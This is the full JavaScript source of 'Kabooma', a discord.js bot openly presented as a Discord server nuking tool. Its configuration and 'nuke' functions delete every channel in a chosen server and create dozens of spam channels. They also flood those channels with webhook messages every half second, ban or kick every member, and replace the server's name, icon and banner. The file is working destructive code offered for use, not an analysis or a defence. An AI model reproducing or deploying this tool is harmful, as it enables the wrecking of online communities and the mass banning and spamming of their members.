
//    ===================================
//    -- Kabooma Discord Nuker ----------
//    --- By: @RatWithAFace -------------
//    ---- Edited: 12/23/2023 -----------
//    ===================================

const { Client, Events, GatewayIntentBits, Partials, EmbedBuilder, ButtonBuilder, ButtonStyle, ActionRowBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder } = require('discord.js')
let config = {client:require('./configuration/client.json'),bot:require('./configuration/bot.json')}
const fs = require('node:fs')
const { stdout, stdin } = require('node:process')
const readline = require('node:readline/promises')
const chalk = require('chalk')
const title = chalk.redBright(fs.readFileSync('./resources/titleAscii')+'\n'+chalk.blueBright('Discord Nuke Utility | Version 1.0 | Created By: @RatWithAFace\n'))
const clipboard = require('copy-paste')

function reloadConfig() {
   delete require.cache[require.resolve('./configuration/client.json')]
   delete require.cache[require.resolve('./configuration/bot.json')]
   config = {client:require('./configuration/client.json'),bot:require('./configuration/bot.json')}
   console.log('Successfully reloaded all configuration files!')
}
 
async function setup() {
   console.clear()
   let answers = {token: '', clientID: '', botName: '', id: 0}
   let name =''
   console.log(title)
   console.log(chalk.yellowBright('It seems that this is your first time using Kabooma!'))
   const rl = readline.createInterface({ input: stdin, output: stdout })
   name = await rl.question('What is your name? ')
   console.log(chalk.yellowBright(`Alright ${name}, let's set up your first bot.`))
   answers.botName = await rl.question('What shall this bot be named? ')
   answers.clientID = await rl.question('Client ID [Right-Click to paste]: ')
   answers.token = await rl.question('Auth Token [Right-Click to paste]: ')
   rl.close()
   botc = JSON.parse(fs.readFileSync('./configuration/bot.json'))
   Promise.all([
      fs.writeFileSync('./configuration/bot.json', JSON.stringify({bots: [answers]})),
      fs.writeFileSync('./configuration/client.json', JSON.stringify({ name, setup: true, admin: false }))
   ]).then(() => {
      botc = JSON.parse(fs.readFileSync('./configuration/bot.json'))
      console.log(chalk.blueBright('[INFO] Main script running in 3 seconds.'))
      setTimeout(() => {main(true)}, 3000)
   })
}

function main(setup) {
   console.clear()
   console.log(title)
   if (setup) {
      delete require.cache[require.resolve('./configuration/client.json')]
      delete require.cache[require.resolve('./configuration/bot.json')]
      config = {client:require('./configuration/client.json'),bot:require('./configuration/bot.json')}
      console.log('Successfully reloaded all configuration files!')
   }

   let mainClient = new Client({ intents: [
      GatewayIntentBits.DirectMessages,
      GatewayIntentBits.Guilds,
      GatewayIntentBits.MessageContent,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.GuildWebhooks
   ], partials: [ Partials.Channel ]})

   mainClient.once(Events.ClientReady, c => {
      console.log(chalk.yellowBright(`Welcome, ${config.client.name}!\nMain client logged in as ${mainClient.user.tag} / ${mainClient.user.id}\nUse ?help for a list of commands`))
      if (mainClient.guilds.cache.size == 0) {
         console.warn(`Your main client is not present in any guild! Invite them here:\nhttps://discord.com/api/oauth2/authorize?client_id=${config.bot.bots[0].clientID}&permissions=8&scope=bot+applications.commands`)
      }
   })

   mainClient.on(Events.MessageCreate, async message => {
      if (message.channel.type == 1) {
         if (config.client.admin === false) {
            vCode = Math.random().toString(36).slice(2) + Math.random().toString(36).toUpperCase().slice(2)
            currentConfig = JSON.parse(fs.readFileSync('./configuration/client.json'))
            currentConfig.admin = 0
            Promise.all([
               fs.writeFileSync(`./configuration/temp/${message.author.id}-verification.txt`, `${vCode}`),
               fs.writeFileSync('./configuration/client.json', JSON.stringify(currentConfig))
            ]).then(() => {
               reloadConfig()
               clipboard.copy(vCode, () => console.log(chalk.blueBright(`@${message.author.username} has sent a DM to the main client!\nSince there are no current admins, please send the bot this message to verify your identity:\n${vCode}\nIt has been copied to your clipboard.`)))
            })
         } else if (config.client.admin == 0) {
            if (message.content == fs.readFileSync(`./configuration/temp/${message.author.id}-verification.txt`)) {
               console.log('Verified!')
               currentConfig = JSON.parse(fs.readFileSync('./configuration/client.json'))
               currentConfig.admin = message.author.id
               fs.writeFileSync('./configuration/client.json', JSON.stringify(currentConfig))
               fs.unlinkSync(`./configuration/temp/${message.author.id}-verification.txt`)
               reloadConfig()
            }
         } else if (config.client.admin == message.author.id) {
            const prefix = '?'
            if (!message.content.startsWith(prefix)) return
            const command= message.content.slice(prefix.length)

            async function configCreate(message, name) {
               let newConfig = {

                  channels: {
                     enabled: true,
                     channelNames: "", 
                     amount: 50
                  },
              
                  webhook: {
                     enabled: true,
                     name: "" 
                  },
              
                  banning: {
                     enabled: false, 
                     banReason: "" 
                  },
              
                  server: {
                     enabled: true,
                     nameChange: "", 
                     iconChange: "",
                     bannerChange: "" 
                  }
               }
               const enableChannel = new ButtonBuilder()
               .setCustomId('enablechannel')
               .setLabel('Enable')
               .setStyle(ButtonStyle.Success)
               const disableChannel = new ButtonBuilder()
               .setCustomId('disablechannel')
               .setLabel('Disable')
               .setStyle(ButtonStyle.Danger)
               const channelRow = new ActionRowBuilder()
               .addComponents(enableChannel,disableChannel)
               await message.reply({content: 'Creating new config!\nEnable channel spam?', components: [channelRow]})

               const newSequence = async (interaction, moduleName, message) => {
                  const enable = new ButtonBuilder()
                  .setCustomId(`enable${moduleName}`)
                  .setLabel('Enable')
                  .setStyle(ButtonStyle.Success)
                  const disable = new ButtonBuilder()
                  .setCustomId(`disable${moduleName}`)
                  .setLabel('Disable')
                  .setStyle(ButtonStyle.Danger)
                  const row = new ActionRowBuilder()
                  .addComponents(enable,disable)
                  await interaction.reply({content: message, components: [row]})
               }
               const listener = async interaction => {
                  if (!interaction.isButton || !interaction.isModalSubmit || !interaction.isAnySelectMenu) return
                  switch (interaction.customId) {
                     case 'enablechannel':
                        const channelModal = new ModalBuilder()
                        .setCustomId('channelmodal')
                        .setTitle('Channel Spam Configuration')
                        const channelNames = new TextInputBuilder()
                        .setCustomId('channelnames')
                        .setLabel('channelNames : string')
                        .setStyle(TextInputStyle.Short)
                        const channelAmount = new TextInputBuilder()
                        .setCustomId('channelamount')
                        .setLabel('channelAmount : integer')
                        .setStyle(TextInputStyle.Short)
                        const channelModalRow1 = new ActionRowBuilder().addComponents(channelNames)
                        const channelModalRow2 = new ActionRowBuilder().addComponents(channelAmount)
                        channelModal.addComponents(channelModalRow1, channelModalRow2)
                        interaction.showModal(channelModal)
                        break
                     case 'channelmodal':
                        newConfig.channels.enabled = true
                        newConfig.channels.channelNames = interaction.fields.getTextInputValue('channelnames')
                        newConfig.channels.amount = parseInt(interaction.fields.getTextInputValue('channelamount'))
                        newSequence(interaction, 'webhook', 'Enable mass webhook spam?')
                        break
                     case 'disablechannel':
                        newConfig.channels.enabled = false
                        newSequence(interaction, 'webhook', 'Enable mass webhook spam?')
                        break
                     case 'enablewebhook':
                        const webhookModal = new ModalBuilder()
                        .setCustomId('webhookmodal')
                        .setTitle('Mass Webhook Spam Configuration')
                        const webhookName = new TextInputBuilder()
                        .setCustomId('webhooknames')
                        .setLabel('webhookNames : string')
                        .setStyle(TextInputStyle.Short)
                        const webhookAvatar = new TextInputBuilder()
                        .setCustomId('webhookavatar')
                        .setLabel('webhookAvatar : string (url)')
                        .setStyle(TextInputStyle.Short)
                        const webhookMessage = new TextInputBuilder()
                        .setCustomId('webhookmessage')
                        .setLabel('webhookMessage : string')
                        .setStyle(TextInputStyle.Short)
                        const webhookModalRow1 = new ActionRowBuilder().addComponents(webhookName)
                        const webhookModalRow2 = new ActionRowBuilder().addComponents(webhookAvatar)
                        const webhookModalRow3 = new ActionRowBuilder().addComponents(webhookMessage)
                        webhookModal.addComponents(webhookModalRow1, webhookModalRow2, webhookModalRow3)
                        interaction.showModal(webhookModal)
                        break
                     case 'webhookmodal':
                        newConfig.webhook.enabled = true
                        newConfig.webhook.name = interaction.fields.getTextInputValue('webhooknames')
                        newConfig.webhook.avatar = interaction.fields.getTextInputValue('webhookavatar')
                        newConfig.webhook.message = interaction.fields.getTextInputValue('webhookmessage')
                        newSequence(interaction, 'banning', 'Enable mass banning?')
                        break
                     case 'disablewebhook':
                        newConfig.webhook.enabled = false
                        newSequence(interaction, 'banning', 'Enable mass banning?')
                        break
                     case 'enablebanning':
                        const banningModal = new ModalBuilder()
                        .setCustomId('banningmodal')
                        .setTitle('Mass Banning Configuration')
                        const banningReason = new TextInputBuilder()
                        .setCustomId('banningreason')
                        .setLabel('banningReason : string')
                        .setStyle(TextInputStyle.Short)
                        const banningModalRow1 = new ActionRowBuilder().addComponents(banningReason)
                        banningModal.addComponents(banningModalRow1)
                        interaction.showModal(banningModal)
                        break
                     case 'banningmodal':
                        newConfig.banning.enabled = true
                        newConfig.banning.banReason = interaction.fields.getTextInputValue('banningreason')
                        newSequence(interaction, 'server', 'Enable changing server information?')
                        break
                     case 'disablebanning':
                        newConfig.banning.enabled = false
                        newSequence(interaction, 'server', 'Enable changing server information?')
                        break
                     case 'enableserver':
                        const serverModal = new ModalBuilder()
                        .setCustomId('servermodal')
                        .setTitle('Server Settings Change Config')
                        const serverNameChange = new TextInputBuilder()
                        .setCustomId('servername')
                        .setLabel('serverNameChange : string')
                        .setStyle(TextInputStyle.Short)
                        const serverIconChange = new TextInputBuilder()
                        .setCustomId('servericon')
                        .setLabel('serverIconChange : string (url)')
                        .setStyle(TextInputStyle.Short)
                        const serverBannerChange = new TextInputBuilder()
                        .setCustomId('serverbanner')
                        .setLabel('serverBannerChange : string (url)')
                        .setStyle(TextInputStyle.Short)
                        const serverModalRow1 = new ActionRowBuilder().addComponents(serverNameChange)
                        const serverModalRow2 = new ActionRowBuilder().addComponents(serverIconChange)
                        const serverModalRow3 = new ActionRowBuilder().addComponents(serverBannerChange)
                        serverModal.addComponents(serverModalRow1, serverModalRow2, serverModalRow3)
                        interaction.showModal(serverModal)
                        break
                     case 'servermodal':
                        newConfig.server.enabled = true
                        newConfig.server.nameChange = interaction.fields.getTextInputValue('servername')
                        newConfig.server.iconChange = interaction.fields.getTextInputValue('servericon')
                        newConfig.server.bannerChange = interaction.fields.getTextInputValue('serverbanner')
                        if (name) {
                           mainClient.off(Events.InteractionCreate, listener)
                           fs.writeFile(`./configuration/nukes/${name}.json`, JSON.stringify(newConfig), () => {
                              nuke(interaction, `${name}.json`)
                           })
                        } else {
                           const nameConfig = new ButtonBuilder()
                           .setCustomId(`nameconfig`)
                           .setLabel('Name')
                           .setStyle(ButtonStyle.Success)
                           const row = new ActionRowBuilder().addComponents(nameConfig)
                           await interaction.reply({content: 'Name your config.', components: [row]})
                        }
                        break
                     case 'disableserver':
                        newConfig.server.enabled = false
                        if (name) {
                           mainClient.off(Events.InteractionCreate, listener)
                           fs.writeFile(`./configuration/nukes/${name}.json`, JSON.stringify(newConfig), () => {
                              nuke(interaction, `${name}.json`)
                           })
                        } else {
                           const nameConfig = new ButtonBuilder()
                           .setCustomId(`nameconfig`)
                           .setLabel('Name')
                           .setStyle(ButtonStyle.Success)
                           const row = new ActionRowBuilder().addComponents(nameConfig)
                           await interaction.reply({content: 'Name your config.', components: [row]})
                        }
                        break
                     case 'namemodal':
                        await interaction.reply('New config successfully created!')
                        mainClient.off(Events.InteractionCreate, listener)
                        fs.writeFileSync(`./configuration/nukes/${interaction.fields.getTextInputValue('configname')}.json`, JSON.stringify(newConfig))
                        break
                     case 'nameconfig':
                        var nameModal = new ModalBuilder()
                        .setCustomId('namemodal')
                        .setTitle('Config')
                        var configName = new TextInputBuilder()
                        .setCustomId('configname')
                        .setLabel('NAME FOR CONFIGURATION FILE')
                        .setStyle(TextInputStyle.Short)
                        var nameRow1 = new ActionRowBuilder().addComponents(configName)
                        nameModal.addComponents(nameRow1)
                        interaction.showModal(nameModal)
                        break
                     default:
                        await interaction.reply('An unexpected error occured at configCreate() switch!')
                        break
                  }
               }
               mainClient.on(Events.InteractionCreate, listener)
            }

            async function nuke(message, config) {
               var guildNames = mainClient.guilds.cache.map(guild => guild.name)
               var guildIDs = mainClient.guilds.cache.map(guild => guild.id )
               var opts = []
               var guild = ''


               for (let i = 0; i < guildNames.length; i++) {
                  opts.push({
                        label: guildNames[i],
                        value: guildIDs[i],
                        description: `Guild ID: ${guildIDs[i]}`
                   })
               }
       
               var embed = new EmbedBuilder()
               .setTitle('Kabooma Nuke Panel')
               .setAuthor({name: 'Kabooma v1.0.0-beta'})
               .setColor('#fc00bd')
               .setDescription('Welcome to the Kabooma Nuke Panel. Please select a guild to nuke.')
       
               var component = new ActionRowBuilder()
               .addComponents(
                  new StringSelectMenuBuilder()
                  .setCustomId('guild')
                  .setPlaceholder('Select a guild.')
                  .addOptions(opts)
               )

               await message.reply({embeds: [embed], components: [component]})

               const nuker = async (interaction) => {
                  if (config) {
                     var usedConfig = JSON.parse(fs.readFileSync(`./configuration/nukes/${config}`))
                  } else {
                     var usedConfig = JSON.parse(fs.readFileSync(`./configuration/nukes/${interaction.values[0]}`))
                  }
                  await interaction.reply('Kaboom!')

                  if (usedConfig.server.enabled) {
                     guild.setName(usedConfig.server.nameChange)
                     guild.setIcon(usedConfig.server.iconChange)
                     if (guild.banner != null) {
                         guild.setBanner(usedConfig.server.bannerChange)
                     }
                  }

                  if (usedConfig.channels.enabled && !usedConfig.webhook.enabled) {
                     var gChannels = guild.channels.cache.map(channel => channel.id)
                     for (let i = 0; i < gChannels.length; i++) {
                        guild.channels.cache.get(gChannels[i]).delete()
                     }
                     for (let loop = 0; loop < usedConfig.channels.amount; loop++) {
                        try {
                           guild.channels.create({name: `${usedConfig.channels.channelNames}-${loop}`})
                        } catch (error) {
                           loop--
                           throw error
                        }
                    }
                  }

                  if (usedConfig.channels.enabled && usedConfig.webhook.enabled) {
                     var gChannels = guild.channels.cache.map(channel => channel.id)
              
                     async function webhookSpam(webhook) { 
                         var wInterval = setInterval(() => {
                             try {
                                 webhook.send(usedConfig.webhook.message)
                             } catch (error) {
                                 throw error
                             }
                         }, 490);
                         setTimeout(() => {
                             clearInterval(wInterval)
                         }, 300000)
                     }
                     
                     for (let i = 0; i < gChannels.length; i++) {
                         guild.channels.cache.get(gChannels[i]).delete()
                     }
                 
                     for (let loop = 0; loop < usedConfig.channels.amount; loop++) {
                         try {
                             guild.channels.create({name: `${usedConfig.channels.channelNames}-${loop}`}).then(async channel => {
                                 setTimeout(() => {
                                     channel.createWebhook({name: usedConfig.webhook.name, avatar: usedConfig.webhook.avatar}).then(webhook => { webhookSpam(webhook) })
                                 }, 300)
                             })
                         } catch (error) {
                             loop--
                             throw error
                         }
                     }
                  }

                  if (!usedConfig.channels.enabled && usedConfig.webhook.enabled) {
                     for (let i = 0; i < gChannels.length; i++) {
                        try {
                           guild.channels.cache.get(gChannels[i]).createWebhook({name: usedConfig.webhook.name, avatar: usedConfig.webhook.avatar}).then(webhook => { webhookSpam(webhook) })
                        } catch (error) {
                           i--
                           throw error
                        }
                     }
                  }
              
                  if (usedConfig.banning.enabled) {
                      var gMembers = guild.members.cache.map(member => member.id)
              
                      for (let i = 0; i < gMembers.length; i++) {
                          var member = guild.members.cache.get(gMembers[i])
                          if (member.bannable) {
                              member.ban({reason: usedConfig.banning.banReason})
                          } else if (member.kickable) {
                              member.kick(usedConfig.banning.banReason)
                          }
                      }
                  }
               }

               mainClient.on(Events.InteractionCreate, async interaction => {
                  if (!interaction.isAnySelectMenu) return
                  switch (interaction.customId) {
                     case 'guild':
                        guild = mainClient.guilds.cache.get(interaction.values[0])
                        if (config) {
                           nuker(interaction)
                        } else {
                           configs = fs.readdirSync('./configuration/nukes')
                           opts = []
                           for (let i = 0; i < configs.length; i++) {
                              opts.push({
                                 label: configs[i],
                                 value: configs[i]
                              })
                           }
                           var component = new ActionRowBuilder()
                           .addComponents(
                              new StringSelectMenuBuilder()
                              .setCustomId('config')
                              .setPlaceholder('Select a configuration file.')
                              .addOptions(opts)
                           )
                           var embed = new EmbedBuilder()
                           .setColor('#fc00bd')
                           .setDescription('Last step! Please select a configuration file to load.')
                           await interaction.reply({embeds: [embed], components: [component]})
                        }
                        break
                     case 'config':
                        nuker(interaction)
                  }
               })
            }

            if (command === 'help') {
               const helpMenu = new EmbedBuilder()
               .setTitle("Kabooma help menu")
               .setDescription("Every command you could possibly\nneed in kabooma.")
               .addFields(
                 {
                   name: "?quicknuke",
                   value: "Initiates a nuke on a server w/o setting\nprevious configuration.",
                   inline: false
                 },
                 {
                   name: "?configcreate",
                   value: "Creates a new nuke configuration.",
                   inline: false
                 },
                 {
                   name: "?nuke",
                   value: "Nukes a server with a set configuration.",
                   inline: false
                 },
               )
               .setColor("#ff0095")
               .setFooter({
                 text: "Kabooma - Created by @RatWithAFace",
               })
               .setTimestamp()
               await message.reply({ embeds: [helpMenu] })
            }

            if (command === 'configcreate') {
               configCreate(message)
            }

            if (command === 'nuke') {
               nuke(message)
            }

            if (command === 'quicknuke') {
               var tempConfig = Math.floor(Math.random() * 9999) + 1000
               configCreate(message, tempConfig.toString())
            }

         } else return
      }
   })

   mainClient.login(config.bot.bots[0].token)
}

config.client.setup ? main() : setup()